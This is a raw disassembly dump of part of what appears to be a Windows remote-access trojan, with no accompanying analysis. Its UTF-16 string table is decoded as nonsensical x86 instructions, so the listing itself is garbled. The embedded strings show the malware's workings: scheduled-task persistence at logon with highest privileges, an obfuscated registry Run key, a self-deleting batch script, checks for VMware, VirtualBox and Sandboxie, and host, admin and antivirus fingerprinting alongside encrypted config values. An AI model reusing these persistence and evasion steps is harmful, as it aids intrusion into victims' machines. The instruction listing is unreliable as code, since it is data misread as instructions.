  40b663:	00 78 00             	add    %bh,0x0(%eax)
  40b666:	66 00 42 00          	data16 add %al,0x0(%edx)
  40b66a:	77 00                	ja     0x40b66c
  40b66c:	59                   	pop    %ecx
  40b66d:	00 52 00             	add    %dl,0x0(%edx)
  40b670:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40b674:	6e                   	outsb  %ds:(%esi),(%dx)
  40b675:	00 52 00             	add    %dl,0x0(%edx)
  40b678:	44                   	inc    %esp
  40b679:	00 70 00             	add    %dh,0x0(%eax)
  40b67c:	59                   	pop    %ecx
  40b67d:	00 50 00             	add    %dl,0x0(%eax)
  40b680:	51                   	push   %ecx
  40b681:	00 76 00             	add    %dh,0x0(%esi)
  40b684:	49                   	dec    %ecx
  40b685:	00 4a 00             	add    %cl,0x0(%edx)
  40b688:	38 00                	cmp    %al,(%eax)
  40b68a:	72 00                	jb     0x40b68c
  40b68c:	37                   	aaa
  40b68d:	00 5a 00             	add    %bl,0x0(%edx)
  40b690:	6e                   	outsb  %ds:(%esi),(%dx)
  40b691:	00 6f 00             	add    %ch,0x0(%edi)
  40b694:	68 00 59 00 73       	push   $0x73005900
  40b699:	00 30                	add    %dh,(%eax)
  40b69b:	00 32                	add    %dh,(%edx)
  40b69d:	00 65 00             	add    %ah,0x0(%ebp)
  40b6a0:	6a 00                	push   $0x0
  40b6a2:	2b 00                	sub    (%eax),%eax
  40b6a4:	4a                   	dec    %edx
  40b6a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6a8:	76 00                	jbe    0x40b6aa
  40b6aa:	73 00                	jae    0x40b6ac
  40b6ac:	79 00                	jns    0x40b6ae
  40b6ae:	54                   	push   %esp
  40b6af:	00 48 00             	add    %cl,0x0(%eax)
  40b6b2:	36 00 64 00 46       	add    %ah,%ss:0x46(%eax,%eax,1)
  40b6b7:	00 79 00             	add    %bh,0x0(%ecx)
  40b6ba:	54                   	push   %esp
  40b6bb:	00 68 00             	add    %ch,0x0(%eax)
  40b6be:	62 00                	bound  %eax,(%eax)
  40b6c0:	75 00                	jne    0x40b6c2
  40b6c2:	58                   	pop    %eax
  40b6c3:	00 52 00             	add    %dl,0x0(%edx)
  40b6c6:	77 00                	ja     0x40b6c8
  40b6c8:	78 00                	js     0x40b6ca
  40b6ca:	4c                   	dec    %esp
  40b6cb:	00 73 00             	add    %dh,0x0(%ebx)
  40b6ce:	58                   	pop    %eax
  40b6cf:	00 57 00             	add    %dl,0x0(%edi)
  40b6d2:	7a 00                	jp     0x40b6d4
  40b6d4:	53                   	push   %ebx
  40b6d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6d8:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40b6dc:	70 00                	jo     0x40b6de
  40b6de:	31 00                	xor    %eax,(%eax)
  40b6e0:	39 00                	cmp    %eax,(%eax)
  40b6e2:	51                   	push   %ecx
  40b6e3:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b6e9:	03 30                	add    (%eax),%esi
  40b6eb:	00 00                	add    %al,(%eax)
  40b6ed:	80 b1 2f 00 45 00 77 	xorb   $0x77,0x45002f(%ecx)
  40b6f4:	00 68 00             	add    %ch,0x0(%eax)
  40b6f7:	5a                   	pop    %edx
  40b6f8:	00 4e 00             	add    %cl,0x0(%esi)
  40b6fb:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40b6ff:	56                   	push   %esi
  40b700:	00 57 00             	add    %dl,0x0(%edi)
  40b703:	56                   	push   %esi
  40b704:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40b708:	00 4d 00             	add    %cl,0x0(%ebp)
  40b70b:	6c                   	insb   (%dx),%es:(%edi)
  40b70c:	00 2f                	add    %ch,(%edi)
  40b70e:	00 6e 00             	add    %ch,0x0(%esi)
  40b711:	30 00                	xor    %al,(%eax)
  40b713:	6a 00                	push   $0x0
  40b715:	69 00 68 00 43 00    	imul   $0x430068,(%eax),%eax
  40b71b:	53                   	push   %ebx
  40b71c:	00 49 00             	add    %cl,0x0(%ecx)
  40b71f:	33 00                	xor    (%eax),%eax
  40b721:	2b 00                	sub    (%eax),%eax
  40b723:	2f                   	das
  40b724:	00 4e 00             	add    %cl,0x0(%esi)
  40b727:	4f                   	dec    %edi
  40b728:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40b72c:	00 6e 00             	add    %ch,0x0(%esi)
  40b72f:	54                   	push   %esp
  40b730:	00 36                	add    %dh,(%esi)
  40b732:	00 35 00 57 00 38    	add    %dh,0x38005700
  40b738:	00 4e 00             	add    %cl,0x0(%esi)
  40b73b:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40b73f:	38 00                	cmp    %al,(%eax)
  40b741:	35 00 41 00 70       	xor    $0x70004100,%eax
  40b746:	00 79 00             	add    %bh,0x0(%ecx)
  40b749:	6c                   	insb   (%dx),%es:(%edi)
  40b74a:	00 4f 00             	add    %cl,0x0(%edi)
  40b74d:	56                   	push   %esi
  40b74e:	00 52 00             	add    %dl,0x0(%edx)
  40b751:	6e                   	outsb  %ds:(%esi),(%dx)
  40b752:	00 67 00             	add    %ah,0x0(%edi)
  40b755:	46                   	inc    %esi
  40b756:	00 61 00             	add    %ah,0x0(%ecx)
  40b759:	49                   	dec    %ecx
  40b75a:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b75e:	00 30                	add    %dh,(%eax)
  40b760:	00 6f 00             	add    %ch,0x0(%edi)
  40b763:	49                   	dec    %ecx
  40b764:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b768:	00 52 00             	add    %dl,0x0(%edx)
  40b76b:	34 00                	xor    $0x0,%al
  40b76d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b76e:	00 45 00             	add    %al,0x0(%ebp)
  40b771:	5a                   	pop    %edx
  40b772:	00 56 00             	add    %dl,0x0(%esi)
  40b775:	75 00                	jne    0x40b777
  40b777:	55                   	push   %ebp
  40b778:	00 71 00             	add    %dh,0x0(%ecx)
  40b77b:	2b 00                	sub    (%eax),%eax
  40b77d:	4f                   	dec    %edi
  40b77e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b781:	72 00                	jb     0x40b783
  40b783:	34 00                	xor    $0x0,%al
  40b785:	7a 00                	jp     0x40b787
  40b787:	53                   	push   %ebx
  40b788:	00 52 00             	add    %dl,0x0(%edx)
  40b78b:	2f                   	das
  40b78c:	00 66 00             	add    %ah,0x0(%esi)
  40b78f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b790:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b794:	00 46 00             	add    %al,0x0(%esi)
  40b797:	49                   	dec    %ecx
  40b798:	00 41 00             	add    %al,0x0(%ecx)
  40b79b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b7a0:	09 6e 00             	or     %ebp,0x0(%esi)
  40b7a3:	75 00                	jne    0x40b7a5
  40b7a5:	6c                   	insb   (%dx),%es:(%edi)
  40b7a6:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b7aa:	01 00                	add    %eax,(%eax)
  40b7ac:	03 3a                	add    (%edx),%edi
  40b7ae:	00 00                	add    %al,(%eax)
  40b7b0:	0d 50 00 61 00       	or     $0x610050,%eax
  40b7b5:	63 00                	arpl   %eax,(%eax)
  40b7b7:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b7ba:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b7be:	09 50 00             	or     %edx,0x0(%eax)
  40b7c1:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b7c7:	00 0f                	add    %cl,(%edi)
  40b7c9:	4d                   	dec    %ebp
  40b7ca:	00 65 00             	add    %ah,0x0(%ebp)
  40b7cd:	73 00                	jae    0x40b7cf
  40b7cf:	73 00                	jae    0x40b7d1
  40b7d1:	61                   	popa
  40b7d2:	00 67 00             	add    %ah,0x0(%edi)
  40b7d5:	65 00 00             	add    %al,%gs:(%eax)
  40b7d8:	07                   	pop    %es
  40b7d9:	63 00                	arpl   %eax,(%eax)
  40b7db:	6d                   	insl   (%dx),%es:(%edi)
  40b7dc:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b7e0:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b7e6:	00 73 00             	add    %dh,0x0(%ebx)
  40b7e9:	63 00                	arpl   %eax,(%eax)
  40b7eb:	68 00 74 00 61       	push   $0x61007400
  40b7f0:	00 73 00             	add    %dh,0x0(%ebx)
  40b7f3:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b7f6:	00 20                	add    %ah,(%eax)
  40b7f8:	00 2f                	add    %ch,(%edi)
  40b7fa:	00 63 00             	add    %ah,0x0(%ebx)
  40b7fd:	72 00                	jb     0x40b7ff
  40b7ff:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b803:	74 00                	je     0x40b805
  40b805:	65 00 20             	add    %ah,%gs:(%eax)
  40b808:	00 2f                	add    %ch,(%edi)
  40b80a:	00 66 00             	add    %ah,0x0(%esi)
  40b80d:	20 00                	and    %al,(%eax)
  40b80f:	2f                   	das
  40b810:	00 73 00             	add    %dh,0x0(%ebx)
  40b813:	63 00                	arpl   %eax,(%eax)
  40b815:	20 00                	and    %al,(%eax)
  40b817:	6f                   	outsl  %ds:(%esi),(%dx)
  40b818:	00 6e 00             	add    %ch,0x0(%esi)
  40b81b:	6c                   	insb   (%dx),%es:(%edi)
  40b81c:	00 6f 00             	add    %ch,0x0(%edi)
  40b81f:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b823:	6e                   	outsb  %ds:(%esi),(%dx)
  40b824:	00 20                	add    %ah,(%eax)
  40b826:	00 2f                	add    %ch,(%edi)
  40b828:	00 72 00             	add    %dh,0x0(%edx)
  40b82b:	6c                   	insb   (%dx),%es:(%edi)
  40b82c:	00 20                	add    %ah,(%eax)
  40b82e:	00 68 00             	add    %ch,0x0(%eax)
  40b831:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b837:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b83b:	74 00                	je     0x40b83d
  40b83d:	20 00                	and    %al,(%eax)
  40b83f:	2f                   	das
  40b840:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b844:	00 20                	add    %ah,(%eax)
  40b846:	00 22                	add    %ah,(%edx)
  40b848:	00 00                	add    %al,(%eax)
  40b84a:	11 22                	adc    %esp,(%edx)
  40b84c:	00 20                	add    %ah,(%eax)
  40b84e:	00 2f                	add    %ch,(%edi)
  40b850:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b854:	00 20                	add    %ah,(%eax)
  40b856:	00 27                	add    %ah,(%edi)
  40b858:	00 22                	add    %ah,(%edx)
  40b85a:	00 01                	add    %al,(%ecx)
  40b85c:	13 22                	adc    (%edx),%esp
  40b85e:	00 27                	add    %ah,(%edi)
  40b860:	00 20                	add    %ah,(%eax)
  40b862:	00 26                	add    %ah,(%esi)
  40b864:	00 20                	add    %ah,(%eax)
  40b866:	00 65 00             	add    %ah,0x0(%ebp)
  40b869:	78 00                	js     0x40b86b
  40b86b:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b871:	5c                   	pop    %esp
  40b872:	00 6e 00             	add    %ch,0x0(%esi)
  40b875:	75 00                	jne    0x40b877
  40b877:	52                   	push   %edx
  40b878:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b87c:	00 6f 00             	add    %ch,0x0(%edi)
  40b87f:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b885:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b889:	74 00                	je     0x40b88b
  40b88b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b88c:	00 65 00             	add    %ah,0x0(%ebp)
  40b88f:	72 00                	jb     0x40b891
  40b891:	72 00                	jb     0x40b893
  40b893:	75 00                	jne    0x40b895
  40b895:	43                   	inc    %ebx
  40b896:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b89a:	00 77 00             	add    %dh,0x0(%edi)
  40b89d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b89e:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b8a2:	00 69 00             	add    %ch,0x0(%ecx)
  40b8a5:	57                   	push   %edi
  40b8a6:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b8aa:	00 66 00             	add    %ah,0x0(%esi)
  40b8ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8ae:	00 73 00             	add    %dh,0x0(%ebx)
  40b8b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8b2:	00 72 00             	add    %dh,0x0(%edx)
  40b8b5:	63 00                	arpl   %eax,(%eax)
  40b8b7:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b8bd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8c1:	61                   	popa
  40b8c2:	00 77 00             	add    %dh,0x0(%edi)
  40b8c5:	74 00                	je     0x40b8c7
  40b8c7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b8cb:	53                   	push   %ebx
  40b8cc:	00 00                	add    %al,(%eax)
  40b8ce:	03 22                	add    (%edx),%esp
  40b8d0:	00 00                	add    %al,(%eax)
  40b8d2:	09 2e                	or     %ebp,(%esi)
  40b8d4:	00 62 00             	add    %ah,0x0(%edx)
  40b8d7:	61                   	popa
  40b8d8:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b8dc:	13 40 00             	adc    0x0(%eax),%eax
  40b8df:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b8e3:	68 00 6f 00 20       	push   $0x20006f00
  40b8e8:	00 6f 00             	add    %ch,0x0(%edi)
  40b8eb:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b8ef:	00 1f                	add    %bl,(%edi)
  40b8f1:	74 00                	je     0x40b8f3
  40b8f3:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b8f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8fa:	00 75 00             	add    %dh,0x0(%ebp)
  40b8fd:	74 00                	je     0x40b8ff
  40b8ff:	20 00                	and    %al,(%eax)
  40b901:	33 00                	xor    (%eax),%eax
  40b903:	20 00                	and    %al,(%eax)
  40b905:	3e 00 20             	add    %ah,%ds:(%eax)
  40b908:	00 4e 00             	add    %cl,0x0(%esi)
  40b90b:	55                   	push   %ebp
  40b90c:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b910:	15 53 00 54 00       	adc    $0x540053,%eax
  40b915:	41                   	inc    %ecx
  40b916:	00 52 00             	add    %dl,0x0(%edx)
  40b919:	54                   	push   %esp
  40b91a:	00 20                	add    %ah,(%eax)
  40b91c:	00 22                	add    %ah,(%edx)
  40b91e:	00 22                	add    %ah,(%edx)
  40b920:	00 20                	add    %ah,(%eax)
  40b922:	00 22                	add    %ah,(%edx)
  40b924:	00 00                	add    %al,(%eax)
  40b926:	07                   	pop    %es
  40b927:	43                   	inc    %ebx
  40b928:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b92c:	00 00                	add    %al,(%eax)
  40b92e:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b932:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b936:	00 22                	add    %ah,(%edx)
  40b938:	00 00                	add    %al,(%eax)
  40b93a:	0f 22 00             	mov    %eax,%cr0
  40b93d:	20 00                	and    %al,(%eax)
  40b93f:	2f                   	das
  40b940:	00 66 00             	add    %ah,0x0(%esi)
  40b943:	20 00                	and    %al,(%eax)
  40b945:	2f                   	das
  40b946:	00 71 00             	add    %dh,0x0(%ecx)
  40b949:	00 05 78 00 70 00    	add    %al,0x700078
  40b94f:	00 45 53             	add    %al,0x53(%ebp)
  40b952:	00 65 00             	add    %ah,0x0(%ebp)
  40b955:	6c                   	insb   (%dx),%es:(%edi)
  40b956:	00 65 00             	add    %ah,0x0(%ebp)
  40b959:	63 00                	arpl   %eax,(%eax)
  40b95b:	74 00                	je     0x40b95d
  40b95d:	20 00                	and    %al,(%eax)
  40b95f:	2a 00                	sub    (%eax),%al
  40b961:	20 00                	and    %al,(%eax)
  40b963:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b967:	6f                   	outsl  %ds:(%esi),(%dx)
  40b968:	00 6d 00             	add    %ch,0x0(%ebp)
  40b96b:	20 00                	and    %al,(%eax)
  40b96d:	57                   	push   %edi
  40b96e:	00 69 00             	add    %ch,0x0(%ecx)
  40b971:	6e                   	outsb  %ds:(%esi),(%dx)
  40b972:	00 33                	add    %dh,(%ebx)
  40b974:	00 32                	add    %dh,(%edx)
  40b976:	00 5f 00             	add    %bl,0x0(%edi)
  40b979:	43                   	inc    %ebx
  40b97a:	00 6f 00             	add    %ch,0x0(%edi)
  40b97d:	6d                   	insl   (%dx),%es:(%edi)
  40b97e:	00 70 00             	add    %dh,0x0(%eax)
  40b981:	75 00                	jne    0x40b983
  40b983:	74 00                	je     0x40b985
  40b985:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b989:	53                   	push   %ebx
  40b98a:	00 79 00             	add    %bh,0x0(%ecx)
  40b98d:	73 00                	jae    0x40b98f
  40b98f:	74 00                	je     0x40b991
  40b991:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b995:	00 19                	add    %bl,(%ecx)
  40b997:	4d                   	dec    %ebp
  40b998:	00 61 00             	add    %ah,0x0(%ecx)
  40b99b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b99c:	00 75 00             	add    %dh,0x0(%ebp)
  40b99f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b9a3:	63 00                	arpl   %eax,(%eax)
  40b9a5:	74 00                	je     0x40b9a7
  40b9a7:	75 00                	jne    0x40b9a9
  40b9a9:	72 00                	jb     0x40b9ab
  40b9ab:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9af:	00 2b                	add    %ch,(%ebx)
  40b9b1:	6d                   	insl   (%dx),%es:(%edi)
  40b9b2:	00 69 00             	add    %ch,0x0(%ecx)
  40b9b5:	63 00                	arpl   %eax,(%eax)
  40b9b7:	72 00                	jb     0x40b9b9
  40b9b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9ba:	00 73 00             	add    %dh,0x0(%ebx)
  40b9bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9be:	00 66 00             	add    %ah,0x0(%esi)
  40b9c1:	74 00                	je     0x40b9c3
  40b9c3:	20 00                	and    %al,(%eax)
  40b9c5:	63 00                	arpl   %eax,(%eax)
  40b9c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9c8:	00 72 00             	add    %dh,0x0(%edx)
  40b9cb:	70 00                	jo     0x40b9cd
  40b9cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9ce:	00 72 00             	add    %dh,0x0(%edx)
  40b9d1:	61                   	popa
  40b9d2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b9d6:	00 6f 00             	add    %ch,0x0(%edi)
  40b9d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9da:	00 00                	add    %al,(%eax)
  40b9dc:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b9df:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9e0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b9e4:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9e8:	0f 56 00             	orps   (%eax),%xmm0
  40b9eb:	49                   	dec    %ecx
  40b9ec:	00 52 00             	add    %dl,0x0(%edx)
  40b9ef:	54                   	push   %esp
  40b9f0:	00 55 00             	add    %dl,0x0(%ebp)
  40b9f3:	41                   	inc    %ecx
  40b9f4:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b9f8:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b9fd:	77 00                	ja     0x40b9ff
  40b9ff:	61                   	popa
  40ba00:	00 72 00             	add    %dh,0x0(%edx)
  40ba03:	65 00 00             	add    %al,%gs:(%eax)
  40ba06:	15 56 00 69 00       	adc    $0x690056,%eax
  40ba0b:	72 00                	jb     0x40ba0d
  40ba0d:	74 00                	je     0x40ba0f
  40ba0f:	75 00                	jne    0x40ba11
  40ba11:	61                   	popa
  40ba12:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40ba16:	00 6f 00             	add    %ch,0x0(%edi)
  40ba19:	78 00                	js     0x40ba1b
  40ba1b:	00 17                	add    %dl,(%edi)
  40ba1d:	53                   	push   %ebx
  40ba1e:	00 62 00             	add    %ah,0x0(%edx)
  40ba21:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40ba27:	6c                   	insb   (%dx),%es:(%edi)
  40ba28:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40ba2c:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40ba30:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ba34:	11 45 00             	adc    %eax,0x0(%ebp)
  40ba37:	72 00                	jb     0x40ba39
  40ba39:	72 00                	jb     0x40ba3b
  40ba3b:	20 00                	and    %al,(%eax)
  40ba3d:	48                   	dec    %eax
  40ba3e:	00 57 00             	add    %dl,0x0(%edi)
  40ba41:	49                   	dec    %ecx
  40ba42:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba46:	05 78 00 32 00       	add    $0x320078,%eax
  40ba4b:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40ba51:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40ba57:	74 00                	je     0x40ba59
  40ba59:	49                   	dec    %ecx
  40ba5a:	00 6e 00             	add    %ch,0x0(%esi)
  40ba5d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba61:	00 09                	add    %cl,(%ecx)
  40ba63:	48                   	dec    %eax
  40ba64:	00 57 00             	add    %dl,0x0(%edi)
  40ba67:	49                   	dec    %ecx
  40ba68:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba6c:	09 55 00             	or     %edx,0x0(%ebp)
  40ba6f:	73 00                	jae    0x40ba71
  40ba71:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba75:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba7b:	00 13                	add    %dl,(%ebx)
  40ba7d:	4d                   	dec    %ebp
  40ba7e:	00 69 00             	add    %ch,0x0(%ecx)
  40ba81:	63 00                	arpl   %eax,(%eax)
  40ba83:	72 00                	jb     0x40ba85
  40ba85:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba86:	00 73 00             	add    %dh,0x0(%ebx)
  40ba89:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba8a:	00 66 00             	add    %ah,0x0(%esi)
  40ba8d:	74 00                	je     0x40ba8f
  40ba8f:	00 03                	add    %al,(%ebx)
  40ba91:	20 00                	and    %al,(%eax)
  40ba93:	00 09                	add    %cl,(%ecx)
  40ba95:	54                   	push   %esp
  40ba96:	00 72 00             	add    %dh,0x0(%edx)
  40ba99:	75 00                	jne    0x40ba9b
  40ba9b:	65 00 00             	add    %al,%gs:(%eax)
  40ba9e:	0b 36                	or     (%esi),%esi
  40baa0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40baa3:	62 00                	bound  %eax,(%eax)
  40baa5:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40baab:	46                   	inc    %esi
  40baac:	00 61 00             	add    %ah,0x0(%ecx)
  40baaf:	6c                   	insb   (%dx),%es:(%edi)
  40bab0:	00 73 00             	add    %dh,0x0(%ebx)
  40bab3:	65 00 00             	add    %al,%gs:(%eax)
  40bab6:	0b 33                	or     (%ebx),%esi
  40bab8:	00 32                	add    %dh,(%edx)
  40baba:	00 62 00             	add    %ah,0x0(%edx)
  40babd:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40bac3:	50                   	push   %eax
  40bac4:	00 61 00             	add    %ah,0x0(%ecx)
  40bac7:	74 00                	je     0x40bac9
  40bac9:	68 00 00 0f 56       	push   $0x560f0000
  40bace:	00 65 00             	add    %ah,0x0(%ebp)
  40bad1:	72 00                	jb     0x40bad3
  40bad3:	73 00                	jae    0x40bad5
  40bad5:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40badb:	00 0b                	add    %cl,(%ebx)
  40badd:	41                   	inc    %ecx
  40bade:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40bae2:	00 69 00             	add    %ch,0x0(%ecx)
  40bae5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bae6:	00 00                	add    %al,(%eax)
  40bae8:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40baec:	00 75 00             	add    %dh,0x0(%ebp)
  40baef:	65 00 00             	add    %al,%gs:(%eax)
  40baf2:	0b 66 00             	or     0x0(%esi),%esp
  40baf5:	61                   	popa
  40baf6:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40bafa:	00 65 00             	add    %ah,0x0(%ebp)
  40bafd:	00 17                	add    %dl,(%edi)
  40baff:	50                   	push   %eax
  40bb00:	00 65 00             	add    %ah,0x0(%ebp)
  40bb03:	72 00                	jb     0x40bb05
  40bb05:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bb09:	72 00                	jb     0x40bb0b
  40bb0b:	6d                   	insl   (%dx),%es:(%edi)
  40bb0c:	00 61 00             	add    %ah,0x0(%ecx)
  40bb0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb10:	00 63 00             	add    %ah,0x0(%ebx)
  40bb13:	65 00 00             	add    %al,%gs:(%eax)
  40bb16:	11 50 00             	adc    %edx,0x0(%eax)
  40bb19:	61                   	popa
  40bb1a:	00 73 00             	add    %dh,0x0(%ebx)
  40bb1d:	74 00                	je     0x40bb1f
  40bb1f:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bb23:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bb29:	41                   	inc    %ecx
  40bb2a:	00 6e 00             	add    %ch,0x0(%esi)
  40bb2d:	74 00                	je     0x40bb2f
  40bb2f:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb35:	72 00                	jb     0x40bb37
  40bb37:	75 00                	jne    0x40bb39
  40bb39:	73 00                	jae    0x40bb3b
  40bb3b:	00 13                	add    %dl,(%ebx)
  40bb3d:	49                   	dec    %ecx
  40bb3e:	00 6e 00             	add    %ch,0x0(%esi)
  40bb41:	73 00                	jae    0x40bb43
  40bb43:	74 00                	je     0x40bb45
  40bb45:	61                   	popa
  40bb46:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb4a:	00 65 00             	add    %ah,0x0(%ebp)
  40bb4d:	64 00 00             	add    %al,%fs:(%eax)
  40bb50:	09 50 00             	or     %edx,0x0(%eax)
  40bb53:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb54:	00 6e 00             	add    %ch,0x0(%esi)
  40bb57:	67 00 00             	add    %al,(%bx,%si)
  40bb5a:	0b 47 00             	or     0x0(%edi),%eax
  40bb5d:	72 00                	jb     0x40bb5f
  40bb5f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb60:	00 75 00             	add    %dh,0x0(%ebp)
  40bb63:	70 00                	jo     0x40bb65
  40bb65:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bb6b:	00 2b                	add    %ch,(%ebx)
  40bb6d:	5c                   	pop    %esp
  40bb6e:	00 72 00             	add    %dh,0x0(%edx)
  40bb71:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb72:	00 6f 00             	add    %ch,0x0(%edi)
  40bb75:	74 00                	je     0x40bb77
  40bb77:	5c                   	pop    %esp
  40bb78:	00 53 00             	add    %dl,0x0(%ebx)
  40bb7b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb7f:	75 00                	jne    0x40bb81
  40bb81:	72 00                	jb     0x40bb83
  40bb83:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb89:	43                   	inc    %ebx
  40bb8a:	00 65 00             	add    %ah,0x0(%ebp)
  40bb8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb8e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb92:	00 72 00             	add    %dh,0x0(%edx)
  40bb95:	32 00                	xor    (%eax),%al
  40bb97:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb9d:	6c                   	insb   (%dx),%es:(%edi)
  40bb9e:	00 65 00             	add    %ah,0x0(%ebp)
  40bba1:	63 00                	arpl   %eax,(%eax)
  40bba3:	74 00                	je     0x40bba5
  40bba5:	20 00                	and    %al,(%eax)
  40bba7:	2a 00                	sub    (%eax),%al
  40bba9:	20 00                	and    %al,(%eax)
  40bbab:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bbaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbb0:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbb3:	20 00                	and    %al,(%eax)
  40bbb5:	41                   	inc    %ecx
  40bbb6:	00 6e 00             	add    %ch,0x0(%esi)
  40bbb9:	74 00                	je     0x40bbbb
  40bbbb:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bbc1:	72 00                	jb     0x40bbc3
  40bbc3:	75 00                	jne    0x40bbc5
  40bbc5:	73 00                	jae    0x40bbc7
  40bbc7:	50                   	push   %eax
  40bbc8:	00 72 00             	add    %dh,0x0(%edx)
  40bbcb:	6f                   	outsl  %ds:(%esi),(%dx)
